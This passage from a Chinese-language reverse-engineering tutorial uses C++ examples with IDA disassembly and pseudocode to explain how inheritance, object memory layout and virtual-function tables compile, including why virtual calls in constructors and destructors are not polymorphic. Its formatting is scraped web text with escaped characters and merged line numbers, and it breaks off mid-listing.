&lt;string.h&gt;#pragma warning(disable : 4996)class Base &#123; //基类定义public:\tBase() &#123;\t\tprintf(&quot;Base\\n&quot;);\t&#125;\t~Base() &#123;\t\tprintf(&quot;~Base\\n&quot;);\t&#125;\tvoid setNumber(int n) &#123;\t\tbase = n;\t&#125;\tint getNumber() &#123;\t\treturn base;\t&#125;public:\tint base;&#125;;class Derive : public Base &#123; //派生类定义public:\tvoid showNumber(int n) &#123;\t\tsetNumber(n);\t\tderive = n + 1;\t\tprintf(&quot;%d\\n&quot;, getNumber());\t\tprintf(&quot;%d\\n&quot;, derive);\t&#125;public:\tint derive;&#125;;int main(int argc, char* argv[]) &#123;\tDerive derive;\tderive.showNumber(argc);\treturn 0;&#125;\n\n\n\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165//main函数.text:00401140 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401140 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401140.text:00401140 var_1C          = dword ptr -1Ch.text:00401140 var_18          = byte ptr -18h.text:00401140 var_10          = dword ptr -10h.text:00401140 var_C           = dword ptr -0Ch.text:00401140 var_4           = dword ptr -4.text:00401140 argc            = dword ptr  8.text:00401140 argv            = dword ptr  0Ch.text:00401140 envp            = dword ptr  10h.text:00401140.text:00401140 ; FUNCTION CHUNK AT .text:00401E80 SIZE 00000008 BYTES.text:00401140 ; FUNCTION CHUNK AT .text:00401E8D SIZE 00000027 BYTES.text:00401140.text:00401140 ; __unwind &#123; // _main_SEH.text:00401140                 push    ebp.text:00401141                 mov     ebp, esp.text:00401143                 push    0FFFFFFFFh.text:00401145                 push    offset _main_SEH.text:0040114A                 mov     eax, large fs:0.text:00401150                 push    eax.text:00401151                 sub     esp, 10h.text:00401154                 mov     eax, ___security_cookie.text:00401159                 xor     eax, ebp.text:0040115B                 mov     [ebp-10h], eax.text:0040115E                 push    eax.text:0040115F                 lea     eax, [ebp-0Ch].text:00401162                 mov     large fs:0, eax.text:00401168                 lea     ecx, [ebp-18h]  ; 获取对象首地址作为this指针.text:0040116B                 call    sub_4011C0      ; 调用类Derive的构造函数，编译器为Derive提供了默认的构造函数.text:00401170 ;   try &#123;.text:00401170                 mov     dword ptr [ebp-4], 0.text:00401177                 mov     eax, [ebp+8].text:0040117A                 push    eax             ; 参数2：argc.text:0040117B                 lea     ecx, [ebp-18h]  ; 参数1：传入this指针.text:0040117E                 call    sub_4010F0      ; 调用成员函数showNumber.text:00401183                 mov     dword ptr [ebp-1Ch], 0.text:00401183 ;   &#125; // starts at 401170.text:0040118A                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:00401191                 lea     ecx, [ebp-18h]  ; 传入this指针.text:00401194                 call    sub_4011E0      ; 调用类Derive的析构函数，编译器为Derive提供了默认的析构函数.text:00401199                 mov     eax, [ebp-1Ch].text:0040119C                 mov     ecx, [ebp-0Ch].text:0040119F                 mov     large fs:0, ecx.text:004011A6                 pop     ecx.text:004011A7                 mov     ecx, [ebp-10h].text:004011AA                 xor     ecx, ebp        ; StackCookie.text:004011AC                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004011B1                 mov     esp, ebp.text:004011B3                 pop     ebp.text:004011B4                 retn.text:004011B4 ; &#125; // starts at 401140.text:004011B4 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[8]; // [esp+8h] [ebp-18h] BYREF  int v5; // [esp+1Ch] [ebp-4h]  sub_4011C0(v4);  v5 = 0;  sub_4010F0(argc);  v5 = -1;  sub_4011E0(v4);  return 0;&#125;//子类Derive的默认构造函数分析.text:004011C0 ; void *__thiscall sub_4011C0(void *this).text:004011C0 sub_4011C0      proc near               ; CODE XREF: _main+2B↑p.text:004011C0.text:004011C0 var_4           = byte ptr -4.text:004011C0.text:004011C0                 push    ebp             ; 子类Derive的默认构造函数分析.text:004011C1                 mov     ebp, esp.text:004011C3                 push    ecx.text:004011C4                 mov     [ebp-4], ecx.text:004011C7                 mov     ecx, [ebp-4]    ; 以子类对象首地址作为父类的this指针.text:004011CA                 call    sub_401080      ; 调用父类构造函数.text:004011CF                 mov     eax, [ebp-4].text:004011D2                 mov     esp, ebp.text:004011D4                 pop     ebp.text:004011D5                 retn.text:004011D5 sub_4011C0      endpvoid *__thiscall sub_4011C0(void *this)&#123;  sub_401080((char)this);  return this;&#125;//父类构造函数.text:00401080 ; int __fastcall sub_401080(char).text:00401080 sub_401080      proc near               ; CODE XREF: sub_4011C0+A↓p.text:00401080.text:00401080 var_4           = dword ptr -4.text:00401080.text:00401080                 push    ebp             ; 父类构造函数.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx             ; char.text:00401084                 mov     [ebp+var_4], ecx.text:00401087                 push    offset Format   ; &quot;Base\\n&quot;.text:0040108C                 call    printf.text:00401091                 add     esp, 4.text:00401094                 mov     eax, [ebp+var_4].text:00401097                 mov     esp, ebp.text:00401099                 pop     ebp.text:0040109A                 retn.text:0040109A sub_401080      endpint __fastcall sub_401080(char a1)&#123;  int v2; // [esp+0h] [ebp-4h]  printf(&quot;Base\\n&quot;, a1);  return v2;&#125;//子类Derive的默认析构函数分析.text:004011E0 ; int __fastcall sub_4011E0(char).text:004011E0 sub_4011E0      proc near               ; CODE XREF: _main+54↑p.text:004011E0                                         ; _main+D43↓j.text:004011E0.text:004011E0 var_4           = byte ptr -4.text:004011E0.text:004011E0                 push    ebp             ; 子类Derive的默认析构函数分析.text:004011E1                 mov     ebp, esp.text:004011E3                 push    ecx.text:004011E4                 mov     [ebp-4], ecx.text:004011E7                 mov     ecx, [ebp-4]    ; 以子类对象首地址作为父类的this指针.text:004011EA                 call    sub_4010A0      ; 调用父类析构函数.text:004011EF                 mov     esp, ebp.text:004011F1                 pop     ebp.text:004011F2                 retn.text:004011F2 sub_4011E0      endpint __fastcall sub_4011E0(char a1)&#123;  return sub_4010A0(a1);&#125;//父类析构函数.text:004010A0 ; int sub_4010A0().text:004010A0 sub_4010A0      proc near               ; CODE XREF: sub_4011E0+A↓p.text:004010A0.text:004010A0 var_4           = dword ptr -4.text:004010A0.text:004010A0                 push    ebp             ; 父类析构函数.text:004010A1                 mov     ebp, esp.text:004010A3                 push    ecx             ; char.text:004010A4                 mov     [ebp+var_4], ecx.text:004010A7                 push    offset aBase_0  ; &quot;~Base\\n&quot;.text:004010AC                 call    printf.text:004010B1                 add     esp, 4.text:004010B4                 mov     esp, ebp.text:004010B6                 pop     ebp.text:004010B7                 retn.text:004010B7 sub_4010A0      endpint sub_4010A0()&#123;  return printf(&quot;~Base\\n&quot;);&#125;\n\n上面代码中，在子类对象Derive的内存布局中，首地址处的第一个数据是父类数据成员base，向后的4字节数据为自身数据成员derive，如下表所示。\n\n有了这样的内存结构，不但可以使用指向子类对象的子类指针间接寻址到父类定义的成员，还可以使用指向子类对象的父类指针间接寻址到父类定义的成员。在使用父类成员函数时，传递的this指针也可以是子类对象的首地址。因此，在父类中，可以根据以上内存结构将子类对象的首地址视为父类对象的首地址实现对数据的操作，而且不会出错。因为父类对象的长度不超过子类对象，而子类对象只要派生新的数据，其长度即可超过父类，所以子类指针的寻址范围不小于父类指针。在使用子类指针访问父类对象时，如果访问的成员数据是父类对象定义的，则不会出错；如果访问的是子类派生的成员数据，则会造成访问越界。\n子类调用父类函数12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Base &#123; //基类定义public:\tBase() &#123;\t\tprintf(&quot;Base\\n&quot;);\t&#125;\t~Base() &#123;\t\tprintf(&quot;~Base\\n&quot;);\t&#125;\tvoid setNumber(int n) &#123;\t\tbase = n;\t&#125;\tint getNumber() &#123;\t\treturn base;\t&#125;public:\tint base;&#125;;class Derive : public Base &#123; //派生类定义public:\tvoid showNumber(int n) &#123;\t\tsetNumber(n);\t\tderive = n + 1;\t\tprintf(&quot;%d\\n&quot;, getNumber());\t\tprintf(&quot;%d\\n&quot;, derive);\t&#125;public:\tint derive;&#125;;int main(int argc, char* argv[]) &#123;\tDerive derive;\tderive.showNumber(argc);\treturn 0;&#125;\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115//main函数.text:00401140 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401140 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401140.text:00401140 var_1C          = dword ptr -1Ch.text:00401140 var_18          = byte ptr -18h.text:00401140 var_10          = dword ptr -10h.text:00401140 var_C           = dword ptr -0Ch.text:00401140 var_4           = dword ptr -4.text:00401140 argc            = dword ptr  8.text:00401140 argv            = dword ptr  0Ch.text:00401140 envp            = dword ptr  10h.text:00401140.text:00401140 ; FUNCTION CHUNK AT .text:00401E80 SIZE 00000008 BYTES.text:00401140 ; FUNCTION CHUNK AT .text:00401E8D SIZE 00000027 BYTES.text:00401140.text:00401140 ; __unwind &#123; // _main_SEH.text:00401140                 push    ebp.text:00401141                 mov     ebp, esp.text:00401143                 push    0FFFFFFFFh.text:00401145                 push    offset _main_SEH.text:0040114A                 mov     eax, large fs:0.text:00401150                 push    eax.text:00401151                 sub     esp, 10h.text:00401154                 mov     eax, ___security_cookie.text:00401159                 xor     eax, ebp.text:0040115B                 mov     [ebp-10h], eax.text:0040115E                 push    eax.text:0040115F                 lea     eax, [ebp-0Ch].text:00401162                 mov     large fs:0, eax.text:00401168                 lea     ecx, [ebp-18h]  ; 获取对象首地址作为this指针.text:0040116B                 call    sub_4011C0      ; 调用类Derive的构造函数，编译器为Derive提供了默认的构造函数.text:00401170 ;   try &#123;.text:00401170                 mov     dword ptr [ebp-4], 0.text:00401177                 mov     eax, [ebp+8].text:0040117A                 push    eax             ; 参数2：argc.text:0040117B                 lea     ecx, [ebp-18h]  ; 参数1：传入this指针.text:0040117E                 call    sub_4010F0      ; 调用成员函数showNumber.text:00401183                 mov     dword ptr [ebp-1Ch], 0.text:00401183 ;   &#125; // starts at 401170.text:0040118A                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:00401191                 lea     ecx, [ebp-18h]  ; 传入this指针.text:00401194                 call    sub_4011E0      ; 调用类Derive的析构函数，编译器为Derive提供了默认的析构函数.text:00401199                 mov     eax, [ebp-1Ch].text:0040119C                 mov     ecx, [ebp-0Ch].text:0040119F                 mov     large fs:0, ecx.text:004011A6                 pop     ecx.text:004011A7                 mov     ecx, [ebp-10h].text:004011AA                 xor     ecx, ebp        ; StackCookie.text:004011AC                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004011B1                 mov     esp, ebp.text:004011B3                 pop     ebp.text:004011B4                 retn.text:004011B4 ; &#125; // starts at 401140.text:004011B4 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[8]; // [esp+8h] [ebp-18h] BYREF  int v5; // [esp+1Ch] [ebp-4h]  sub_4011C0(v4);  v5 = 0;  sub_4010F0(argc);  v5 = -1;  sub_4011E0(v4);  return 0;&#125;//showNumber函数.text:004010F0 ; int __thiscall sub_4010F0(_DWORD *this, int).text:004010F0 sub_4010F0      proc near               ; CODE XREF: _main+3E↓p.text:004010F0.text:004010F0 var_4           = dword ptr -4.text:004010F0 arg_0           = dword ptr  8.text:004010F0.text:004010F0                 push    ebp             ; showNumber函数.text:004010F1                 mov     ebp, esp.text:004010F3                 push    ecx.text:004010F4                 mov     [ebp-4], ecx    ; [ebp-4]中保留了this指针.text:004010F7                 mov     eax, [ebp+8]    ; 参数2：n.text:004010FA                 push    eax.text:004010FB                 mov     ecx, [ebp-4]    ; 参数1：因为this指针同时也是对象中父类部分的首地址，所以在调用父类成员函数时，this指针的值和子类对象等同.text:004010FE                 call    sub_4010C0      ; 调用基类成员函数setNumber.text:00401103                 mov     ecx, [ebp+8].text:00401106                 add     ecx, 1          ; 将参数n值加1.text:00401109                 mov     edx, [ebp-4]    ; edx拿到this指针.text:0040110C                 mov     [edx+4], ecx    ; 参考内存结构，edx+4是子类成员derive的地址，derive=n+1.text:0040110F                 mov     ecx, [ebp-4]    ; 传递this指针.text:00401112                 call    unknown_libname_1 ; 调用基类成员函数getNumber.text:00401117                 push    eax             ; 参数2：Base.base.text:00401118                 push    offset aD       ; &quot;%d\\n&quot;.text:0040111D                 call    printf.text:00401122                 add     esp, 8.text:00401125                 mov     eax, [ebp-4].text:00401128                 mov     ecx, [eax+4].text:0040112B                 push    ecx             ; 参数2：derive.text:0040112C                 push    offset aD       ; &quot;%d\\n&quot;.text:00401131                 call    printf.text:00401136                 add     esp, 8.text:00401139                 mov     esp, ebp.text:0040113B                 pop     ebp.text:0040113C                 retn    4.text:0040113C sub_4010F0      endpint __thiscall sub_4010F0(_DWORD *this, int a2)&#123;  char v2; // al  sub_4010C0(a2);  this[1] = a2 + 1;  v2 = unknown_libname_1(this);  printf(&quot;%d\\n&quot;, v2);  return printf(&quot;%d\\n&quot;, this[1]);&#125;\n\n父类中成员函数setNumber在子类中并没有被定义，但根据派生关系，在子类中可以使用父类的公有函数。\n如果使用对象或对象的指针调用成员函数，编译器可根据对象所属作用域通过“名称粉碎法” [1]实现正确匹配。在成员函数中调用其他成员函数时，可匹配当前作用域。\n在调用父类成员函数时，虽然其this指针传递的是子类对象的首地址，但是在父类成员函数中可以成功寻址到父类中的数据。回想之前提到的对象内存布局，父类数据成员被排列在地址最前端，之后是子类数据成员。showNumber运行后的内存信息如下图所示：\n\n这 时 ， 首 地 址 处 为 父 类 数 据 成 员 ， 而 父 类 中 的 成 员 函 数setNumber在寻址此数据成员时，会将首地址的4字节数据作为数据成员base。由此可见，父类数据成员被排列在最前端是为了在添加派生类后方便子类使用父类中的成员数据，并且可以将子类指针当作父类指针使用。按照继承顺序依次排列各个数据成员，这样一来，不管是操作子类对象还是父类对象，只要确认了对象的首地址，对父类成员数据的偏移量而言都是一样的。对子类对象而言，使用父类指针或者子类指针都可以正确访问其父类数据。反之，如果使用一个父类对象的指针去访问子类对象，则存在越界访问的危险。\n多态（虚函数）学习虚函数时，我们分析了类中的隐藏数据成员——虚表指针。正因为有这个虚表指针，调用虚函数的方式改为查表并间接调用，在虚表中得到函数首地址并跳转到此地址处执行代码。利用此特性即可通过父类指针访问不同的派生类。在调用父类中定义的虚函数时，根据指针指向的对象中的虚表指针，可得到虚表信息，间接调用虚函数，即构成了多态。\n以“人”为基类，可以派生出不同国家的人：中国人、美国人、德国人等。这些人有一个共同的功能——说话，但是他们实现这个功能的过程不同，例如中国人说汉语、美国人说英语、德国人说德语。每个国家的人都有不同的说话方法，为了让“说话”这个方法有一个通用接口，可以设立一个“人”类将其抽象化。使用“人”类的指针或引用调用具体对象的“说话”方法，就形成了多态。\n人类说话方法的多态模拟类结构12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123; // 基类——“人”类public:\tPerson() &#123;&#125;\tvirtual ~Person() &#123;&#125;\tvirtual void showSpeak() &#123;&#125; // 这里用纯虚函数更好，相关的知识点后面会讲到&#125;;class Chinese : public Person &#123; // 中国人：继承自人类public:\tChinese() &#123;&#125;\tvirtual ~Chinese() &#123;&#125;\tvirtual void showSpeak() &#123; // 覆盖基类虚函数\t\tprintf(&quot;Speak Chinese\\r\\n&quot;);\t&#125;&#125;;class American : public Person &#123; //美国人：继承自人类public:\tAmerican() &#123;&#125;\tvirtual ~American() &#123;&#125;\tvirtual void showSpeak() &#123; //覆盖基类虚函数\t\tprintf(&quot;Speak American\\r\\n&quot;);\t&#125;&#125;;class German : public Person &#123; //德国人：继承自人类public:\tGerman() &#123;&#125;\tvirtual ~German() &#123;&#125;\tvirtual void showSpeak() &#123; //覆盖基类虚函数\t\tprintf(&quot;Speak German\\r\\n&quot;);\t&#125;&#125;;void speak(Person* person) &#123; //根据虚表信息获取虚函数首地址并调用\tperson-&gt;showSpeak();&#125;int main(int argc, char* argv[]) &#123;\tChinese chinese;\tAmerican american;\tGerman german;\tspeak(&amp;chinese);\tspeak(&amp;american);\tspeak(&amp;german);\treturn 0;&#125;\n\n上面代码中，利用父类指针可以指向子类的特性，可以间接调用各子类中的虚函数。虽然指针类型为父类，但是因为虚表的排列顺序是按虚函数在类继承层次中首次声明的顺序排列的，所以只要继承了父类，其派生类的虚表中父类部分的排列就与父类一致，子类新定义的虚函数会按照声明顺序紧跟其后。因此，在调用过程中，我们给speak函数传递任何一个基于Person的派生对象地址都可以正确调用虚函数showSpeak。\n在调用虚函数的过程中，程序是如何通过虚表指针访问虚函数的呢？具体分析如下：\n123456789101112131415161718192021222324// main函数分析略// speak函数讲解text:004012B0 sub_4012B0      proc near               ; CODE XREF: _main+53↓p.text:004012B0                                         ; _main+5F↓p ....text:004012B0.text:004012B0 arg_0           = dword ptr  8.text:004012B0.text:004012B0                 push    ebp             ; speak函数.text:004012B1                 mov     ebp, esp.text:004012B3                 mov     eax, [ebp+8]    ; eax获取参数person的值.text:004012B6                 mov     edx, [eax]      ; 取虚表首地址并传递给edx.text:004012B8                 mov     ecx, [ebp+8]    ; 传递this指针.text:004012BB                 mov     eax, [edx+4]    ; 利用虚表指针edx，间接调用函数.text:004012BB                                         ; 回顾父类Person的类型声明，第一个声明的虚函数是析构函数，第二个声明的是showSpeak.text:004012BB                                         ; 所以showSpeak在虚函数表中的位置排第二，[edx+4]即showSpeak的函数地址.text:004012BE                 call    eax.text:004012C0                 pop     ebp.text:004012C1                 retn.text:004012C1 sub_4012B0      endpint __cdecl sub_4012B0(int a1)&#123;  return (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1);&#125;\n\n上面代码中，虚函数的调用过程使用了间接寻址方式，而非直接调用函数地址。由于虚表采用间接调用机制，因此在使用父类指针person调用虚函数时，没有依照其作用域调用Person类中定义的成员函数showSpeak。需要注意的是，GCC编译器虚析构函数会生成两个虚表项，因此showSpeak函数在第三项（后续例子将详细分析）。\n\n\n\n\n\n\n\n\n\n对比如下代码中虚函数调用：24: setNumber(n);010F2C3D mov eax,dword ptr [ebp+8]010F2C40 push eax010F2C41 mov ecx,dword ptr [ebp-8]010F2C44 call 010F13BB ;这里直接调用，无法构成多态\n可以发现，当没有使用对象指针或者对象引用时，调用虚函数指令的寻址方式为直接调用，从而无法构成多态。而上面代码中使用了对象指针调用虚函数，所以会产生间接调用方式，进而构成多态。\n当父类中定义有虚函数时，将会产生虚表。当父类的子类产生对象时，会在调用子类构造函数前优先调用\n父类构造函数，并以子类对象的首地址作为this指针传递给父类构造函数。在父类构造函数中，会先初始化子类虚表指针为父类的虚表首地址。此时，如果在父类构造函数中调用虚函数，虽然虚表指针属于子类对象，但指向的地址却是父类的虚表首地址，这时可判断出虚表所属作用域与当前作用域相同，于是会转换成直接调用方式，最终造成构造函数内的虚函数失效。修改代码清单12-5，在Person类的构造函数中添加虚函数调用，如下所示。\n在父类构造函数中调用虚函数123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123; // 基类——“人”类public:\tPerson() &#123;\t\tshowSpeak(); //调用虚函数，不多态\t&#125;\tvirtual ~Person() &#123;&#125;\tvirtual void showSpeak() &#123;\t\tprintf(&quot;Speak No\\n&quot;);\t&#125; // 这里用纯虚函数更好，相关的知识点后面会讲到&#125;;class Chinese : public Person &#123; // 中国人：继承自人类public:\tChinese() &#123;&#125;\tvirtual ~Chinese() &#123;&#125;\tvirtual void showSpeak() &#123; // 覆盖基类虚函数\t\tprintf(&quot;Speak Chinese\\r\\n&quot;);\t&#125;&#125;;class American : public Person &#123; //美国人：继承自人类public:\tAmerican() &#123;&#125;\tvirtual ~American() &#123;&#125;\tvirtual void showSpeak() &#123; //覆盖基类虚函数\t\tprintf(&quot;Speak American\\r\\n&quot;);\t&#125;&#125;;class German : public Person &#123; //德国人：继承自人类public:\tGerman() &#123;&#125;\tvirtual ~German() &#123;&#125;\tvirtual void showSpeak() &#123; //覆盖基类虚函数\t\tprintf(&quot;Speak German\\r\\n&quot;);\t&#125;&#125;;void speak(Person* person) &#123; //根据虚表信息获取虚函数首地址并调用\tperson-&gt;showSpeak();&#125;int main(int argc, char* argv[]) &#123;\tChinese chinese;\treturn 0;&#125;\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293//main函数.text:004011A0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004011A0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004011A0.text:004011A0 var_C           = dword ptr -0Ch.text:004011A0 var_8           = byte ptr -8.text:004011A0 var_4           = dword ptr -4.text:004011A0 argc            = dword ptr  8.text:004011A0 argv            = dword ptr  0Ch.text:004011A0 envp            = dword ptr  10h.text:004011A0.text:004011A0                 push    ebp.text:004011A1                 mov     ebp, esp.text:004011A3                 sub     esp, 0Ch.text:004011A6                 mov     eax, ___security_cookie.text:004011AB                 xor     eax, ebp.text:004011AD                 mov     [ebp-4], eax.text:004011B0                 lea     ecx, [ebp-8]    ; 获取对象首地址作为this指针.text:004011B3                 call    sub_401110      ; 调用类Chinese的构造函数.text:004011B8                 mov     dword ptr [ebp-0Ch], 0.text:004011BF                 lea     ecx, [ebp-8]    ; 传入this指针.text:004011C2                 call    sub_401130      ; 调用类Chinese的析构函数.text:004011C7                 mov     eax, [ebp-0Ch].text:004011CA                 mov     ecx, [ebp-4].text:004011CD                 xor     ecx, ebp        ; StackCookie.text:004011CF                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004011D4                 mov     esp, ebp.text:004011D6                 pop     ebp.text:004011D7                 retn.text:004011D7 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[4]; // [esp+4h] [ebp-8h] BYREF  sub_401110(v4);  sub_401130(v4);  return 0;&#125;//Chinese的构造函数.text:00401110 ; _DWORD *__thiscall sub_401110(_DWORD *this).text:00401110 sub_401110      proc near               ; CODE XREF: _main+13↓p.text:00401110.text:00401110 var_4           = dword ptr -4.text:00401110.text:00401110                 push    ebp             ; 类Chinese的构造函数.text:00401111                 mov     ebp, esp.text:00401113                 push    ecx.text:00401114                 mov     [ebp-4], ecx.text:00401117                 mov     ecx, [ebp-4]    ; 以子类对象首地址作为父类的this指针.text:0040111A                 call    sub_401080      ; 调用父类Person的构造函数.text:0040111F                 mov     eax, [ebp-4].text:00401122                 mov     dword ptr [eax], offset off_402128 ; 设置虚表指针为自身（Chinese）虚表.text:00401128                 mov     eax, [ebp-4].text:0040112B                 mov     esp, ebp.text:0040112D                 pop     ebp.text:0040112E                 retn.text:0040112E sub_401110      endp_DWORD *__thiscall sub_401110(_DWORD *this)&#123;  sub_401080(this);  *this = &amp;off_402128;  return this;&#125;//Person的构造函数.text:00401080 ; _DWORD *__thiscall sub_401080(_DWORD *this).text:00401080 sub_401080      proc near               ; CODE XREF: sub_401110+A↓p.text:00401080.text:00401080 var_4           = byte ptr -4.text:00401080.text:00401080                 push    ebp             ; Person的构造函数.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx.text:00401084                 mov     [ebp-4], ecx.text:00401087                 mov     eax, [ebp-4].text:0040108A                 mov     dword ptr [eax], offset off_402134 ; 设置虚表指针为Person虚表.text:00401090                 mov     ecx, [ebp-4]    ; char.text:00401093                 call    sub_4010C0      ; 直接调用父类方法showSpeak().text:00401098                 mov     eax, [ebp-4].text:0040109B                 mov     esp, ebp.text:0040109D                 pop     ebp.text:0040109E                 retn.text:0040109E sub_401080      endp_DWORD *__thiscall sub_401080(_DWORD *this)&#123;  *this = &amp;off_402134;  sub_4010C0((char)this);  return this;&#125;\n\n以上代码执行过程如下图所示：\n\n上图演示了构造函数中使用虚函数的流程。按C++规定的构造顺序，父类构造函数会在子类构造函数之前运行，在执行父类构造函数时将虚表指针修改为当前类的虚表指针，也就是父类的虚表指针，因此导致虚函数的特性失效。如果父类构造函数内部存在虚函数调用，这样的顺序能防止在子类中构造父类时，父类根据虚表错误地调用子类的成员函数。\n虽然在构造函数和析构函数中调用虚函数会使其多态性失效，但是为什么还要修改虚表指针呢？编译器直接把构造函数或析构函数中的虚函数调用修改为直接调用方式，不就可以避免这类问题了吗？大家不要忘了，程序员仍然可以自己编写其他成员函数，间接调用本类中声明的其他虚函数。假设类A中定义了成员函数f1()和虚函数f2()，而且类B继承自类A并重写了f2()。根据前面的讲解我们可以知道，在子类B的构造函数执行前会调用父类A的构造函数，此时如果在类A的构造函数中调用f1()，显然不会构成多态，编译器会产生直接调用f1()的代码。但是，如果在f1()中又调用了f2()，就会产生间接调用的指令，形成多态。如果类B对象的虚表指针没有更换为类A的虚表指针，会导致在访问类B的虚表后调用到类B中的f2()函数，而此时类B的对象尚未构造完成，其数据成员是不确定的，这时在f2()中引用类B的对象中的数据成员是很危险的。\n同理，在析构类B的对象时，会先执行类B的析构函数，然后执行类A的析构函数。如果在类A的析构函数中调用f1()，显然也不能构成多态，编译器同样会产生直接调用f1()的代码。但是，如果f1()中又调用了f2()，此时会构成多态，如果这个对象的虚表指针没有更换为类A的虚表指针，同样也会导致访问虚表并调用类B中的f2()。但是，此时B类对象已经执行过析构函数，所以B类中定义的数据已经不可靠了，对其进行操作同样是很危险的。\n在析构函数中，同样需要处理虚函数的调用，因此也需要处理虚函数。按C++中定义的析构顺序，首先调用自身的析构函数，然后调用成员对象的析构函数，最后调用父类的析构函数。在对象析构时，首先设置虚表指针为自身虚表，再调用自身的析构函数。如果有成员对象，则按声明的顺序以倒序方式依次调用成员对象的析构函数。最后，调用父类析构函数。在调用父类的析构函数时，会设置虚表指针为父类自身的虚表。\n构造函数和析构函数中调用虚函数的流程123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123; // 基类——“人”类public:\tPerson() &#123;\t\tshowSpeak(); //添加虚函数调用\t&#125;\tvirtual ~Person() &#123;\t\tshowSpeak(); //添加虚函数调用\t&#125;\tvirtual void showSpeak() &#123;&#125; //纯虚函数，后面会讲解&#125;;class Chinese : public Person &#123; // 中国人：继承自人类public:\tChinese() &#123;&#125;\tvirtual ~Chinese() &#123;&#125;\tvirtual void showSpeak() &#123; // 覆盖基类虚函数\t\tprintf(&quot;Speak Chinese\\r\\n&quot;);\t&#125;&#125;;class American : public Person &#123; //美国人：继承自人类public:\tAmerican() &#123;&#125;\tvirtual ~American() &#123;&#125;\tvirtual void showSpeak() &#123; //覆盖基类虚函数\t\tprintf(&quot;Speak American\\r\\n&quot;);\t&#125;&#125;;class German : public Person &#123; //德国人：继承自人类public:\tGerman() &#123;&#125;\tvirtual ~German() &#123;&#125;\tvirtual void showSpeak() &#123; //覆盖基类虚函数\t\tprintf(&quot;Speak German\\r\\n&quot;);\t&#125;&#125;;void speak(Person* person) &#123; //根据虚表信息获取虚函数首地址并调用\tperson-&gt;showSpeak();&#125;int main(int argc, char* argv[]) &#123;\tChinese chinese;\treturn 0;&#125;\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165//main函数.text:004011C0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004011C0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004011C0.text:004011C0 var_C           = dword ptr -0Ch.text:004011C0 var_8           = byte ptr -8.text:004011C0 var_4           = dword ptr -4.text:004011C0 argc            = dword ptr  8.text:004011C0 argv            = dword ptr  0Ch.text:004011C0 envp            = dword ptr  10h.text:004011C0.text:004011C0                 push    ebp.text:004011C1                 mov     ebp, esp.text:004011C3                 sub     esp, 0Ch.text:004011C6                 mov     eax, ___security_cookie.text:004011CB                 xor     eax, ebp.text:004011CD                 mov     [ebp-4], eax.text:004011D0                 lea     ecx, [ebp-8]    ; 传递this指针.text:004011D3                 call    sub_401130      ; 调用Chinese的构造函数.text:004011D8                 mov     dword ptr [ebp-0Ch], 0.text:004011DF                 lea     ecx, [ebp-8]    ; 传递this指针.text:004011E2                 call    sub_401150      ; 调用Chinese的析构函数.text:004011E7                 mov     eax, [ebp-0Ch].text:004011EA                 mov     ecx, [ebp-4].text:004011ED                 xor     ecx, ebp        ; StackCookie.text:004011EF                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004011F4                 mov     esp, ebp.text:004011F6                 pop     ebp.text:004011F7                 retn.text:004011F7 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[4]; // [esp+4h] [ebp-8h] BYREF  sub_401130(v4);  sub_401150(v4);  return 0;&#125;//Chinese的构造函数.text:00401130 ; _DWORD *__thiscall sub_401130(_DWORD *this).text:00401130 sub_401130      proc near               ; CODE XREF: _main+13↓p.text:00401130.text:00401130 var_4           = dword ptr -4.text:00401130.text:00401130                 push    ebp             ; Chinese的构造函数.text:00401131                 mov     ebp, esp.text:00401133                 push    ecx.text:00401134                 mov     [ebp-4], ecx.text:00401137                 mov     ecx, [ebp-4]    ; 传入当前this指针，将其作为父类的this指针.text:0040113A                 call    sub_401080      ; 调用父类Person的构造函数.text:0040113F                 mov     eax, [ebp-4].text:00401142                 mov     dword ptr [eax], offset off_402124 ; 将虚表设置为Chinese类的虚表.text:00401148                 mov     eax, 